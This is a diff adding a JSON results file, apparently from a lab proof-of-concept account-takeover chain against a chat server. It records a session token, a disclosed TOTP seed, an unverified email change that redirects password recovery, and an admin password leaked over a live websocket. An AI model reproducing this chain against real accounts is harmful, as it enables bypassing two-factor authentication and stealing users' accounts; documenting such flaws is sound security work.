@@ -1,0 +1,124 @@
+{
+  "victim": "vic_5d7a3bf5",
+  "victim_address": "vic_5d7a3bf5@lab.invalid",
+  "attacker_address": "atk_5d7a3bf5@lab.invalid",
+  "password_login_is_gated_by_totp": {
+    "success": false,
+    "error": "totp-required",
+    "details": {
+      "method": "totp",
+      "codeGenerated": false,
+      "availableMethods": [
+        "totp"
+      ]
+    },
+    "message": "TOTP Required"
+  },
+  "step1_reset_session": {
+    "result": {
+      "msg": "result",
+      "id": "0588fdcc",
+      "result": {
+        "id": "q87bw5rfCRL6imzZY",
+        "token": "sSsdPZNLvVcPtFgLG9AczeBRWL0LKSep4cL7CB1DqkR",
+        "tokenExpires": {
+          "$date": 1803304846461
+        },
+        "type": "password"
+      }
+    },
+    "me": "vic_5d7a3bf5"
+  },
+  "step2_seed": {
+    "disclosed_prefix": "NQSTMQJDJV4D",
+    "backup_hashes": 12,
+    "equals_enrolled_seed": true
+  },
+  "step3_email_move": {
+    "status": 200,
+    "address_now": "atk_5d7a3bf5@lab.invalid",
+    "response": {
+      "user": {
+        "_id": "q87bw5rfCRL6imzZY",
+        "createdAt": "2026-11-24T14:00:40.216Z",
+        "services": {
+          "email2fa": {
+            "enabled": true
+          },
+          "totp": {
+            "enabled": true
+          },
+          "password": {
+            "exists": true
+          }
+        },
+        "username": "vic_5d7a3bf5",
+        "emails": [
+          {
+            "address": "atk_5d7a3bf5@lab.invalid",
+            "verified": false
+          }
+        ],
+        "name": "vic_5d7a3bf5",
+        "type": "user",
+        "roles": [
+          "user"
+        ],
+        "status": "offline",
+        "active": true,
+        "_updatedAt": "2026-11-24T14:00:46.944Z",
+        "requirePasswordChange": false,
+        "settings": {
+          "profile": {},
+          "calendar": {}
+        },
+        "lastLogin": "2026-11-24T14:00:46.447Z",
+        "avatarUrl": "http://127.0.0.1:39649/avatar/vic_5d7a3bf5",
+        "isOAuthUser": false
+      },
+      "success": true
+    }
+  },
+  "step3_recovery_moved": {
+    "attacker_mailbox_token": true,
+    "victim_mailbox_token": null,
+    "forgot_for_old_address": {
+      "success": true
+    }
+  },
+  "step4_remediation": {
+    "remove_other_tokens": 200,
+    "socket_alive_after_logout": true,
+    "admin_update": 200,
+    "password_broadcast": "Admin-Reset-5d7a3bf5!7x",
+    "frame": {
+      "msg": "changed",
+      "collection": "stream-notify-user",
+      "id": "id",
+      "fields": {
+        "eventName": "q87bw5rfCRL6imzZY/userData",
+        "args": [
+          {
+            "id": "q87bw5rfCRL6imzZY",
+            "diff": {
+              "_id": "q87bw5rfCRL6imzZY",
+              "password": "Admin-Reset-5d7a3bf5!7x",
+              "emails": [
+                {
+                  "address": "atk_5d7a3bf5@lab.invalid",
+                  "verified": false
+                }
+              ]
+            },
+            "unset": {},
+            "type": "updated"
+          }
+        ]
+      }
+    }
+  },
+  "step4_relogin": {
+    "status": 200,
+    "success": true
+  }
+}
